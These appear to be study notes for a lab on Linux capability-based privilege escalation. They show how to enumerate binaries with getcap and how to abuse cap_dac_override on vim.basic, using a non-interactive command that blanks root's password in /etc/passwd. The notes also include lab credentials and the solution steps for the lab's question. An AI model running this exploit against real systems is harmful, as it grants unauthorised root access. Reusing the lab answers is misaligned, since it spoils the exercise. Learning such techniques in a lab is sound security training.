
### Setting Capabilities

Done with the `setcap` command, `setcap` can be used to set capabilities for specific executables
```
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

### Values for the setcap command
![[setcap_values.png]]

### Capability Functions & Descriptions
![[cap.png]]
### Setcap Privilege Escalation
![[priv_esc.png]]

### Enumerating Capabilities
```
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

> - searchs for all binary executables in the directories where they are typically located 
> -  `-exec` flag to run the `getcap` command on each, showing the capabilities that have been set for that binary
> - output is a list of all binary executables on the system, along with the capabilities that have been set for each

### Exploiting Capabilities

Scenario: We've gained access and 1) we can execute /usr/bin/vim.basic without special privileges 2) discovered the `cap_dac_override` capability is set for the binary, vim.basic:
```
getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```

Let's modify root's /etc/passwd file to allow us to `su` without a password:
```
/usr/bin/vim.basic /etc/passwd
```

Or in a non-interactive mode. After which you'll see the `x` , demarcing the password, is gone meaning you can su into root without the password :
```
datboyblu3@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
datboyblu3@htb[/htb]$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash`
```

----------------------------------------------------------
## Questions

 Escalate the privileges using capabilities and read the flag.txt file in the "/root" directory. Submit its contents as the answer.

IP:
```
10.129.205.111
```

Username:
```
htb-student
```

Password:
```
HTB_@cademy_stdnt!
```

SSH
```
ssh htb-student@10.129.205.111
```

Listed all capabilities
```
getcap -r / 2>/dev/null
 
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_dac_override+eip
/snap/core20/1169/usr/bin/ping = cap_net_raw+ep
/snap/core20/1891/usr/bin/ping = cap_net_raw+ep
/snap/core22/750/usr/bin/ping = cap_net_raw+ep
/snap/core22/634/usr/bin/ping = cap_net_raw+ep

```

Just used the same exploit in the example above to gain root access.

To find and output the contents of the flag:
```
find / -type f -name flag.txt -exec cat {} \; 2>/dev/null
```